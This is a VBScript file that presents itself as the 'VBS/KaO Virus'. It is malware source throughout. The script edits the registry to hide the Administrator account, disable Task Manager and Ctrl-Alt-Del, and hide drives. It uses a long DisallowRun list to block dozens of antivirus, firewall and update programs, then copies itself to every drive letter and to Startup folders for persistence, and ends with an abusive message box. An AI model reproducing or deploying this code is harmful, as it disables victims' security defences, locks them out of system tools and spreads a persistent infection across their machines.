' VBS/KaO Virus

Set shell=CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)


sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function

itemtype = "REG_DWORD"
itemtype2 = "REG_SZ"
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\Administrator" , "0" , itemtype
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner" , "KaO" , itemtpye2  
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization" , "KaO" , itemtpye2
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ShutdownWithoutLogon" , "0" , itemtype2
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoComputersNearMe" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun" , "00000000" , itemtype
 Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DisableCAD" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives" , "01,00,00,00" , itemtype
 
 
 regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\8","taskmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\9","ntbackup.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\10","mcagent.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\11","mcvsshld.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\12","mcshield.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\13","mcvsescn.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\14","mcvsrte.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\15","DefWatch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\16","Rtvscan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\17","ccEvtMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\18","NISUM.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\19","ccPxySvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\20","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\21","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\22","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\23","LUALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\24","DRWEBUPW.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\25","AUTODOWN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\26","alogserv.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\27","RuLaunch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\28","Avconsol.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\29","PavFires.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\30","FIREWALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\31","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\32","Vshwin32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\33","VsStat.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\34","Avsynmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\35","ccApp.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\36","nopdb.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\37","OUTPOST.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\38","ICSSUPPNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\39","ICSUPP95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\40","ESCANH95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\41","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\42","ESCANHNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\43","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\44","AUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\45","AUTOTRACE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\46","AUTOUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\47","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\48","AVWUPD32.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\49","AVPUPD.EXE "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\50","CFIAUDIT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\51","UPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\52","symlcsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\53","MCUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\54","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\55","pavsrv50.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\56","SAVScan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\57","SNDSrvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\58","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\59","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\60","ccProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\61","SHSTAT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\62","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\63","UpdaterUI.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\64","VsTskMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\65","FrameworkService.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\66","LUCOMS~1.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\67","blackd.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\68","bawindo.exe "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\69","AVENGINE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\70","APVXDWIN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\71","pavProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\72","navapw32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\73","IEXPLORE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\74","vpc32.exe"
 fso.copyfile wscript.scriptfullname, "C:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\windows\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\Documents and Settings\All Users\Desktop\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "B:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "D:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "E:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "F:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "G:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "H:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "I:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "J:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "K:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "L:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "M:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "N:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "O:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "P:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "Q:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "R:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "S:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "T:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "U:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "V:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "W:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "X:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "Y:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "Z:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\C:\WINDOWS\Start Menu\Programs\Startup\KaO.vbs"
 
 msgbox "Hello I'm The VBS/KaO Virus Your Fucked!!!"
 
' VBS/KaO Virus 